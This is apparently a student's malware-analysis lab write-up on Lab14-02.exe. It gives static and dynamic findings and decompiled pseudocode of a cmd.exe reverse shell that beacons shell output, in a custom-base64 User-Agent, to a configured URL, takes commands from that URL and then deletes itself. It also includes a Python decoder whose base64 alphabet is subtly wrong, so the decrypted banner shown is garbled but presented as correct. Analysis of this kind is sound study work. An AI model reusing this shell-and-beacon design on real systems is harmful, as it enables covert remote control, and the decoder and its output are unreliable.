Lab14-02.exe
    PE Analysis
        # Virustotal
            50/72
            SHA-256: 435be1c6e904836ad65f97f3eac4cbe19ee7ba0da48178fc7f00206270469165

            PEiD packer
                Microsoft Visual C++

            TimeStamp: 2009-01-08 01:37:00

            Subsystem: Windows GUI
            
            Sections
                Name	Virtual Address	Virtual Size	Raw Size	Entropy	MD5
                .text	4096	2956	3072	6.05	1d71da4792562277aa93c6a071b4e05c
                .rdata	8192	1526	1536	4.99	18f5e8a9da8ff4f9bb6120a84a56850a
                .data	12288	196	512	2.12	fc33a8f1065364f6e35088baf64feb0b
                .rsrc	16384	184	512	0.91	9c49f784f4589173db0efd544c1d4b96

            IMPORT
                KERNEL32.dll
                    PeekNamedPipe
                    TerminateThread
                    SetEvent
                    GetModuleFileNameA
                    ExitThread
                    GetShortPathNameA
                    DisconnectNamedPipe
                    GetCurrentProcess
                    SetThreadPriority
                    lstrcatA
                    SetProcessPriorityBoost
                    WaitForMultipleObjects
                    GetCurrentThread
                    CreateThread
                    GetModuleHandleA
                    CreatePipe
                    ReadFile
                    WriteFile
                    GetStartupInfoA
                    CloseHandle
                    DuplicateHandle
                    SetPriorityClass
                    TerminateProcess
                    CreateProcessA
                    GetEnvironmentVariableA
                    lstrcpyA
                    CreateEventA
                    Sleep
                MSVCRT.dll
                SHELL32.dll
                    SHChangeNotify
                    ShellExecuteExA
                USER32.dll
                    LoadStringA
                WININET.dll
                    InternetReadFile
                    InternetOpenUrlA
                    InternetCloseHandle
                    InternetOpenA

        # strings.exe (Only part of the results)
            WXYZlabcd3fghijko12e456789ABCDEFGHIJKL+/MNOPQRSTUVmn0pqrstuvwxyz
            cmd.exe
            exit
            (!<
            Internet Surf
            Open
            > nul
            /c del
            COMSPEC                             // path of cmd.exe
            http://127.0.0.1/tenfour.html

        # Resource Hacker
            STRINGTABLE
            LANGUAGE LANG_ENGLISH, SUBLANG_ENGLISH_US
            {
            1, 	"http://127.0.0.1/tenfour.html"
            }


    Dynamic Analysis
        # RegShot (Part of results)
            Nothing valuable

        # procexp
            NULL

        # procmon
            Filter
                Process Name is Lab14-02.exe

            Result
                6:30:26.4382927 PM	Lab14-02.exe	4044	QueryOpen	C:\WINDOWS\system32\cmd.exe	SUCCESS	CreationTime: 4/14/2008 4:00:00 AM, LastAccessTime: 5/3/2020 6:30:04 PM, LastWriteTime: 4/14/2008 4:00:00 AM, ChangeTime: 5/3/2020 6:30:04 PM, AllocationSize: 389,120, EndOfFile: 389,120, FileAttributes: A

        # autoruns
            NULL

        # ApateDNS
            127.0.0.1            

        # Netcat
            C:\Documents and Settings\practice\Desktop>nc.exe -lvvp 80
            listening on [any] 80 ...
            DNS fwd/rev mismatch: localhost != malware
            connect to [127.0.0.1] from localhost [127.0.0.1] 1182
            GET /tenfour.html HTTP/1.1
            User-Agent: (!<e6LJC+xnBq90daDNB+1TDrhG6aWG6p9LC/iNBqsGi2sVgJdqhZXDZoMMomKGoqxUE73N9qH0dZltjZ4RhJWUh2XiA6imBriT9/oGoqxmCYsiYG0fonNC1bxJD6pLB/1ndbaS9YXe9710A6t/CpVUC+aJDbLJ95Vl97iPDbxUkG==
            Host: 127.0.0.1
            Cache-Control: no-cache

            C:\Documents and Settings\practice\Desktop>nc.exe -lvvp 80
            listening on [any] 80 ...
            DNS fwd/rev mismatch: localhost != malware
            connect to [127.0.0.1] from localhost [127.0.0.1] 1183
            GET /tenfour.html HTTP/1.1
            User-Agent: Internet Surf
            Host: 127.0.0.1
            Cache-Control: no-cache

        # sc
            NULL

        # IDA Pro & OllyDbg
            .idata:004020D4 ; BOOL __stdcall InternetCloseHandle(HINTERNET hInternet)
            .idata:004020D4                 extrn InternetCloseHandle:dword
            .idata:004020D4                                         ; CODE XREF: sub_401750+A2↑p
            .idata:004020D4                                         ; sub_401750+A5↑p ...
            .idata:004020D8 ; HINTERNET __stdcall InternetOpenUrlA(HINTERNET hInternet, LPCSTR lpszUrl, LPCSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwFlags, DWORD_PTR dwContext)
            .idata:004020D8                 extrn InternetOpenUrlA:dword
            .idata:004020D8                                         ; CODE XREF: sub_401750+8D↑p
            .idata:004020D8                                         ; sub_401800+29↑p
            .idata:004020D8                                         ; DATA XREF: ...
            .idata:004020DC ; HINTERNET __stdcall InternetOpenA(LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxy, LPCSTR lpszProxyBypass, DWORD dwFlags)
            .idata:004020DC                 extrn InternetOpenA:dword
            .idata:004020DC                                         ; CODE XREF: sub_401750+74↑p
            .idata:004020DC                                         ; sub_401800+10↑p
            .idata:004020DC                                         ; DATA XREF: ...
            .idata:004020E0 ; BOOL __stdcall InternetReadFile(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead)
            .idata:004020E0                 extrn InternetReadFile:dword
            .idata:004020E0                                         ; CODE XREF: sub_401800+65↑p
            .idata:004020E0                                         ; DATA XREF: sub_401800+65↑r

            Focus on sub_401750 and sub_401800

            WinMain > StartAddress > sub_401750 > {InternetCloseHandle, InternetOpenUrlA, InternetOpenA}
            WinMain > sub_4015C0 > sub_401800 > {InternetReadFile, InternetCloseHandle, InternetOpenUrlA, InternetOpenA}
                            
            int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
            {
            LoadStringA(hInstance, 1u, &Buffer, 260);
            dword_4030A4 = CreateEventA(0, 1, 0, 0);
            hEvent = CreateEventA(0, 1, 0, 0);
            PipeAttributes.nLength = 12;
            PipeAttributes.lpSecurityDescriptor = 0;
            PipeAttributes.bInheritHandle = 1;
            hWritePipe = 0;
            hReadPipe = 0;
            v16 = 0;
            v4 = malloc(0x118u);
            strcpy(v4 + 20, &Buffer);
            CreatePipe(v4, &hWritePipe, &PipeAttributes, 0);
            CreatePipe(&hReadPipe, v4 + 1, &PipeAttributes, 0);
            StartupInfo.cb = 68;
            StartupInfo.lpReserved = 0;
            StartupInfo.lpTitle = 0;
            StartupInfo.lpDesktop = 0;
            StartupInfo.dwYSize = 0;
            StartupInfo.dwXSize = 0;
            StartupInfo.dwY = 0;
            StartupInfo.dwX = 0;
            StartupInfo.wShowWindow = 0;
            StartupInfo.lpReserved2 = 0;
            StartupInfo.cbReserved2 = 0;
            StartupInfo.dwFlags = 257;
            StartupInfo.hStdError = hWritePipe;
            StartupInfo.hStdOutput = hWritePipe;
            StartupInfo.hStdInput = hReadPipe;
            v5 = GetCurrentProcess();
            v6 = hWritePipe;
            v7 = GetCurrentProcess();
            DuplicateHandle(v7, v6, v5, &StartupInfo.hStdError, 2u, 1, 0);
            strcpy(&CommandLine, cmd_exe);
            if ( CreateProcessA(0, &CommandLine, 0, 0, 1, 0, 0, 0, &StartupInfo, &ProcessInformation) )// reverse shell
            {
                v8 = ProcessInformation.hProcess;
                CloseHandle(ProcessInformation.hThread);
            }
            else
            {
                v8 = v16;
            }
            *(v4 + 2) = v8;
            ThreadAttributes.nLength = 12;
            ThreadAttributes.lpSecurityDescriptor = 0;
            ThreadAttributes.bInheritHandle = 0;
            v9 = CreateThread(&ThreadAttributes, 0, StartAddress, v4, 0, &ThreadId);            // First Internet
            *(v4 + 3) = v9;
            if ( v9 )
            {
                Sleep(5000u);
                v11 = CreateThread(&ThreadAttributes, 0, sub_4015C0, v4, 0, &ThreadId);         // Second Internet
                *(v4 + 4) = v11;
                if ( v11 )
                {
                Handles = *(v4 + 3);
                v21 = *(v4 + 4);
                v22 = *(v4 + 2);
                v12 = WaitForMultipleObjects(3u, &Handles, 0, 0xFFFFFFFF);
                if ( v12 )
                {
                    v13 = v12 - 1;
                    if ( v13 )
                    {
                    if ( v13 == 1 )
                    {
                        TerminateThread(*(v4 + 4), 0);
                        TerminateThread(*(v4 + 3), 0);
                    }
                    }
                    else
                    {
                    TerminateThread(*(v4 + 4), 0);
                    TerminateProcess(*(v4 + 2), 1u);
                    }
                }
                else
                {
                    TerminateThread(*(v4 + 3), 0);
                    TerminateProcess(*(v4 + 2), 1u);
                }
                DisconnectNamedPipe(*v4);
                CloseHandle(*v4);
                DisconnectNamedPipe(*(v4 + 1));
                CloseHandle(*(v4 + 1));
                CloseHandle(*(v4 + 3));
                CloseHandle(*(v4 + 4));
                CloseHandle(*(v4 + 2));
                if ( v4 )
                    free(v4);
                sub_401880();
                result = 0;
                }
                else
                {
                TerminateThread(0, 0);
                sub_401880();
                result = 0;
                }
            }
            else
            {
                TerminateThread(0, 0);
                sub_401880();
                result = 0;
            }
            return result;
            }

            Internet 1
                void __stdcall __noreturn StartAddress(LPVOID lpThreadParameter)
                {
                CHAR *v1; // ebx
                void *v2; // esi
                _WORD *v3; // ebp
                DWORD BytesRead; // [esp+10h] [ebp-4h]

                v1 = malloc(0x118u);
                qmemcpy(v1, lpThreadParameter, 0x118u);
                v2 = operator new(0x258u);
                v3 = operator new(0x32Au);
                memset(v2, 0, 0x258u);
                memset(v3, 0, 0x328u);
                v3[404] = 0;
                while ( PeekNamedPipe(*v1, v2, 4u, &BytesRead, 0, 0) )
                {
                    if ( BytesRead )
                    {
                    ReadFile(*v1, v2, 0x257u, &BytesRead, 0);
                    *(v2 + BytesRead++) = 0;
                    base64(v2, v3);
                    if ( !Internet_1(v3, v1 + 20) )
                        Sleep(0x1F4u);
                    }
                    else
                    {
                    Sleep(0x3E8u);
                    }
                }
                free(v1);
                ExitThread(0);
                }

                void *__cdecl Internet_1(int a1, LPCSTR lpszUrl)            // url comes from LoadStringA from .rsrc section: http://127.0.0.1/tenfour.html
                {
                user_agent = operator new(0x32Du);
                memset(user_agent, 0, 0x32Cu);
                user_agent[812] = 0;
                strcat(user_agent, asc_403068);                             // (!<
                strcat(user_agent, a1);
                v3 = InternetOpenA(user_agent, 0, 0, 0, 0);
                v4 = v3;
                result = InternetOpenUrlA(v3, lpszUrl, 0, 0, 0x80000000, 0);
                if ( result )
                {
                    InternetCloseHandle(result);
                    InternetCloseHandle(v4);
                    result = 1;
                }
                return result;
                }

                Use customized script to decrypt User-Agent, the following is result:
                    Microroft Windows XP [Version 5.1.2600]
                    (C9 Copyright 1985-2001 Micsosoft Cosp.

                    C*\Documentr and Settings\practice\Desktop>

            Internet 2
                void __stdcall __noreturn sub_4015C0(LPVOID lpThreadParameter)
                {
                v1 = operator new(0x100u);
                v2 = operator new(0x100u);
                NumberOfBytesWritten = 0;
                memset(v1, 0, 0x100u);
                memset(v2, 0, 0x100u);
                v5 = v2;
                v3 = malloc(0x118u);
                qmemcpy(v3, lpThreadParameter, 0x118u);
                for ( return_data = Internet_2(v3 + 20); return_data; return_data = Internet_2(v3 + 20) )       // get use input
                {
                    if ( !strcmp(return_data, v5) )
                    {
                    Sleep(3000u);
                    }
                    else
                    {
                    strcpy(v5, return_data);
                    if ( !strnicmp(return_data, Str, 4u) )    // exit
                    {
                        SetEvent(hEvent);
                        free(v3);                               // Destory session
                        ExitThread(0);
                    }
                    strcat(return_data, asc_40305C);
                    if ( !WriteFile(*(v3 + 1), return_data, strlen(return_data), &NumberOfBytesWritten, 0) )
                        break;
                    Sleep(2000u);
                    }
                }
                operator delete(return_data);
                free(v3);
                ExitThread(0);
                }
            
            sub_401880 achieves self-deletion.


Analysis
    The malware firstly build a reverse shell, and then did twice Internet connection. The first one encrypt reverse shell banner with customized base64(). The second one accepts user command and if it is 'exit' then it will destroy the session. The malware do not encrypt the command so it will be detected easily, also it's an only client component, so it depends on the server component, too.


#Base64 decryption
    import string
    import base64

    s = ''
    tab = 'WXYZlabcd3fghijko12e456789ABCDEFGHIJKL+/MNOPQRSTUVmn0pqrstuvwxyz'
    b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxzy0123456789+/'

    cipher = 'e6LJC+xnBq90daDNB+1TDrhG6aWG6p9LC/iNBqsGi2sVgJdqhZXDZoMMomKGoqxUE73N9qH0dZltjZ4RhJWUh2XiA6imBriT9/oGoqxmCYsiYG0fonNC1bxJD6pLB/1ndbaS9YXe9710A6t/CpVUC+aJDbLJ95Vl97iPDbxUkG=='

    for ch in cipher:
        if (ch in tab):
            s += b64[string.find(tab, str(ch))]
        elif (ch == '='):
            s += '='

    print base64.decodestring(s)   